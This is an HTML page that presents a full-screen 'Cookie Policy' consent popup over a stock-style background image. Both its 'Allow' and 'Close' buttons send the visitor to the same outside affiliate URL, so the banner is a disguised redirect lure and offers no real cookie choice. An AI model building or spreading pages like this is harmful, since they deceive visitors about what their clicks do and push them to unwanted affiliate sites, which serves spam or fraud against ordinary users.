<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Responsive Popup Example</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      background: url('https://background-imgs.s3.sa-east-1.amazonaws.com/9b5e1384cb9d162be9b266f9b92c3b/68cc906868ec44567edf6152/1758236794357.jpeg') no-repeat center center fixed;
      background-size: cover;
    }

    /* Mobile background */
    @media (max-width: 768px) {
      body {
        background: url('https://background-imgs.s3.sa-east-1.amazonaws.com/9b5e1384cb9d162be9b266f9b92c3b/68cc906868ec44567edf6152/1758236797182.jpeg') no-repeat center center fixed;
        background-size: cover;
      }
    }

    /* Overlay */
    .overlay {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(0,0,0,0.55);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 9999;
    }

    /* Popup box */
    .popup {
      background: #fff;
      padding: 20px;
      border-radius: 12px;
      width: 90%;
      max-width: 400px;
      text-align: center;
      box-shadow: 0 4px 20px rgba(0,0,0,0.2);
      animation: fadeIn 0.25s ease-in-out;
    }

    .popup h2 {
      margin: 0 0 10px;
      font-size: 20px;
    }

    .popup p {
      font-size: 14px;
      color: #444;
      line-height: 1.4em;
    }

    .buttons {
      margin-top: 20px;
      display: flex;
      justify-content: center;
      gap: 12px;
      flex-wrap: wrap;
    }

    .btn {
      flex: 1;
      min-width: 100px;
      padding: 12px 20px;
      font-size: 15px;
      border-radius: 8px;
      border: none;
      cursor: pointer;
      transition: 0.3s;
    }

    .allow {
      background: #007bff;
      color: #fff;
    }

    .allow:hover {
      background: #0056b3;
    }

    .close {
      background: #fff;
      color: #007bff;
      border: 2px solid #007bff;
    }

    .close:hover {
      background: #007bff;
      color: #fff;
    }

    @keyframes fadeIn {
      from {opacity: 0; transform: scale(0.9);}
      to {opacity: 1; transform: scale(1);}
    }
  </style>
</head>
<body>

  <!-- Popup -->
  <div class="overlay" id="popup">
    <div class="popup">
      <h2>Cookie Policy</h2>
      <p>
        This website uses cookies to personalize content and ads, provide social media features, 
        and analyze our traffic. By clicking 'Allow,' you agree to our use of cookies. 
        For more info, visit our Cookie Policy.
      </p>
      <div class="buttons">
        <button class="btn allow" onclick="redirect('http://synaptigen24.com/text.php#aff=rsc2024')">Allow</button>
        <button class="btn close" onclick="redirect('http://synaptigen24.com/text.php#aff=rsc2024')">Close</button>
      </div>
    </div>
  </div>

  <script>
    function redirect(url) {
      window.location.href = url;
    }
  </script>

</body>
</html>
